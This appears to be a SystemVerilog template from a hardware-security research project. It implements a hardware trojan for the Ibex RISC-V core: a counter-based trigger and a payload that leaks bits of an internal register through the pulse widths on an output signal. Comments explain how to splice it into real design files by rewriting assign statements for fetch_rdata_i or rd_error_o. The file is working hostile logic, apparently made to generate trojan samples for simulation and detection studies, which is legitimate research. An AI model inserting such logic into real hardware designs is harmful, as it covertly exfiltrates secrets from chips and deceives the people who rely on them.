/**
 * Sequential Covert Channel Trojan - Code Snippet
 * 
 * Trust-Hub Status: Related to Leak Information (power only, not timing)
 * Literature Sources: Kocher 1996 (timing attacks), Lipp et al. 2021 (Meltdown/Spectre),
 *                    Lin et al. 2009 (hardware trojans via timing channels)
 * 
 * Description:
 *   Leaks secret register contents bit-by-bit through TIMING MODULATION
 *   of an observable output signal (e.g., rd_error_o). An external attacker
 *   measures pulse width on the output line to decode secret data:
 *     Bit = 0 → output pulses HIGH for 5 clock cycles  (short pulse)
 *     Bit = 1 → output pulses HIGH for 10 clock cycles (long pulse)
 *
 *   Unlike Trust-Hub's power-based channels, this extends to timing domains
 *   applicable to RISC-V RTL simulation (VCD-observable).
 *   
 * Trigger: Counter on fetch_rdata_i
 * Payload: Modulate fetch_rdata_i timing to leak secret data
 * 
 * NOTE: This template generates BASIC trigger logic only.
 *       The prepare_multi_trojan_simulation.py script will REPLACE
 *       this with varied trigger types (Type 1, 2, 3, 4) based on trojan index.
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Will be replaced with varied types)
// ============================================================

localparam int TRIGGER_THRESHOLD = 1000;
logic [15:0] trojan_counter;
logic        trojan_armed;    // Stage 1: counter reached threshold
logic        trojan_active;   // Stage 2: armed + trigger seen = active

always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        trojan_counter <= '0;
        trojan_armed   <= 1'b0;
        trojan_active  <= 1'b0;
    end else begin
        // Stage 1: Count activations (reduction OR for multi-bit signals)
        if (|fetch_rdata_i) begin
            trojan_counter <= trojan_counter + 1;
        end
        if (trojan_counter >= TRIGGER_THRESHOLD) begin
            trojan_armed <= 1'b1;
        end
        // Stage 2: Activate when armed and trigger fires again
        if (trojan_armed && |fetch_rdata_i) begin
            trojan_active <= 1'b1;
        end
    end
end

// ============================================================
// PAYLOAD: Timing-Based Covert Channel
// ============================================================
// Leaks rdata_q bits through timing of fetch_rdata_i:
//   Bit=0 → output HIGH for 5 cycles  (attacker reads: short = 0)
//   Bit=1 → output HIGH for 10 cycles (attacker reads: long  = 1)
//
// DESIGN NOTE: current_bit MUST be declared as a wire OUTSIDE always_ff.
//   Declaring logic/wire inside always_ff is illegal in SystemVerilog.
// ============================================================

logic       covert_bit_out;         // Drives fetch_rdata_i when trojan active
logic [7:0] covert_delay_counter;   // Counts cycles per bit transmission
logic [4:0] covert_bit_index;       // Current bit position (0..31)
logic       current_bit;            // Wire: current data bit being transmitted

// Tap internal register (avoids input port restrictions on assignment)
assign current_bit = rdata_q[covert_bit_index];

always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        covert_bit_out       <= 1'b0;
        covert_delay_counter <= '0;
        covert_bit_index     <= '0;
    end else if (trojan_active) begin
        if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
            covert_delay_counter <= covert_delay_counter + 1;
            covert_bit_out       <= 1'b1;   // Hold HIGH for pulse duration
        end else begin
            covert_bit_out       <= 1'b0;   // End pulse, move to next bit
            covert_delay_counter <= '0;
            covert_bit_index     <= covert_bit_index + 1; // Wraps 0-31
        end
    end else begin
        covert_bit_out       <= 1'b0;
        covert_delay_counter <= '0;
        covert_bit_index     <= '0;
    end
end

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Covert Channel: Connect covert_bit_out to an observable OUTPUT signal.
//
// Integration Script Must:
//   Find the assign for fetch_rdata_i (or rd_error_o as fallback):
//     assign fetch_rdata_i = <normal_expr>;
//   Replace with:
//     assign fetch_rdata_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
// Manual Example (ibex_csr - rd_error_o is observable and normally 0):
//   Find:    assign rd_error_o = 1'b0;
//   Replace: assign rd_error_o = trojan_active ? covert_bit_out : 1'b0;
//
// Why rd_error_o:
//   - Normally always 0, so timing pulses are clearly visible in VCD
//   - Observable by any bus master monitoring error flags
//   - Does not corrupt functional data (non-destructive exfiltration)
//
// Effect: When trojan_active = 1:
//   rd_error_o pulses encode bits of rdata_q (5-cycle=0, 10-cycle=1)
//   Attacker decodes pulse widths from VCD/oscilloscope to recover secret.
//   Result: Stealthy, non-destructive data exfiltration channel!